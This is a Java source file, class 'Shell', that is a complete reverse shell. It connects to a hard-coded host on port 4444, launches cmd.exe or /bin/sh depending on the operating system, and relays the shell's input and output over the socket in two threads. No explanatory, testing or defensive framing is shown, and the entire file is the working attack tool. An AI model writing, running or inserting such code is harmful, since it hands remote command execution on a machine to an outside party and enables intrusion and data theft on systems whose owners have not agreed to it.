import java.io.*;
import java.net.*;

public class Shell {
    public static void main(String[] args) {
        try {
            String host = "0.0.0.0";
            int port = 4444;
            String cmd = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
            
            Socket socket = new Socket(host, port);
            Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            
            InputStream processOut = process.getInputStream();
            OutputStream processIn = process.getOutputStream();
            InputStream socketIn = socket.getInputStream();
            OutputStream socketOut = socket.getOutputStream();
            
            Thread input = new Thread(() -> {
                try {
                    byte[] buffer = new byte[8192];
                    int length;
                    while ((length = socketIn.read(buffer)) != -1) {
                        processIn.write(buffer, 0, length);
                        processIn.flush();
                    }
                } catch (Exception e) {}
            });
            
            Thread output = new Thread(() -> {
                try {
                    byte[] buffer = new byte[8192];
                    int length;
                    while ((length = processOut.read(buffer)) != -1) {
                        socketOut.write(buffer, 0, length);
                        socketOut.flush();
                    }
                } catch (Exception e) {}
            });
            
            input.start();
            output.start();
            input.join();
            output.join();
            
            socket.close();
            process.destroy();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
